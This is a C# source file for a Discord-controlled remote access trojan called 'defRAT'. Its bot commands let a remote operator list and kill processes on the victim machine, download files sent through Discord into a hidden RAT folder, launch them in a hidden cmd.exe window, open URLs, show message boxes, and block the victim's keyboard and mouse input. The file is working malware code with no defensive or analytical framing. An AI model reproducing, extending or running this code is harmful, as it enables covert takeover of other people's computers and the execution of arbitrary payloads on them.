using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Configuration;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Discord;
using Discord.Commands;

namespace defRAT.Modules
{
    public class CommandsModule : ModuleBase<SocketCommandContext>
    {
        [Command("tasklist")]
        public async Task TaskListAsync()
        {
            Process[] processes = Process.GetProcesses();

            string msg = "Processes:\n```";
            List<string> sent = new List<string>();
            foreach (Process process in processes)
            {
                if (sent.Contains(process.ProcessName)) continue;
                sent.Add(process.ProcessName);
                msg += process.Id + " | " + process.ProcessName + "\n";
            }
            msg += "```";

            await ReplyAsync(msg);
        }

        [Command("taskkill")]
        public async Task TaskKillAsync(string id)
        {
            try
            {
                Process process = Process.GetProcessById(int.Parse(id));
                process.Kill();
                await ReplyAsync("Killed process " + process.ProcessName);
            } catch (ArgumentException)
            {
                await ReplyAsync("This process does not exist!");
            }
            
        }

        [Command("killname")]
        public async Task KillByNameAsync(string name)
        {
            Process[] processes = Process.GetProcessesByName(name);
            if (processes.Length >= 1)
            {
                int counter = 0;
                foreach (Process process in processes)
                {
                    process.Kill();
                    counter += 1;
                }

                await ReplyAsync("Killed `" + counter + "` processes");
            } else
            {
                await ReplyAsync("No processes found");
            }
        }

        [Command("upload")]
        public async Task UploadFileAsync()
        {
            foreach (IAttachment attachment in Context.Message.Attachments)
            {
                using (var client = new WebClient())
                {
                    
                    client.DownloadFile(
                        new Uri(attachment.Url), 
                        attachment.Filename
                        );

                    File.Move(attachment.Filename, Program.RAT_DIR_PATH + @"\"+attachment.Filename);
                }
            }

            await ReplyAsync("Downloaded");
        }

        [Command("dir")]
        public async Task DirAsync()
        {
            string[] files = Directory.GetFiles(Program.RAT_DIR_PATH);
            string msg = "Rat Files:\n```";
            foreach (string file in files)
            {
                msg += file + "\n";
            }
            msg += "```";
            await ReplyAsync(msg);
        }

        [Command("start")]
        public async Task StartAsync(string file)
        {
            Process process = new Process();
            ProcessStartInfo info = new ProcessStartInfo();
            info.WindowStyle = ProcessWindowStyle.Hidden;
            info.FileName = "cmd.exe";
            info.Arguments = "/C start " + Program.RAT_DIR_PATH + @"\" + file;
            process.StartInfo = info;
            process.Start();

            await ReplyAsync("Started " + file);
        }

        [Command("msgbox")]
        public async Task MsgBoxAsync(string title, string text)
        {
           
            Thread msgBox = new Thread(() => MessageBox.Show(text, title));
            msgBox.Start();
            await ReplyAsync("Showed msgbox!");
        }

        [Command("visiturl")]
        public async Task VisitUrlAsync(string url)
        {
            Process.Start(url);
            await ReplyAsync("Visiting the url");
        }

        [Command("block")]
        public async Task BlockAsync()
        {
            Program.BLOCKED = !Program.BLOCKED;
            if (Program.BLOCKED)
            {
                Program.BlockInput(true);
            } else
            {
                Program.BlockInput(false);
            }

            await ReplyAsync("Locked: " + Program.BLOCKED);
        }
    }
}
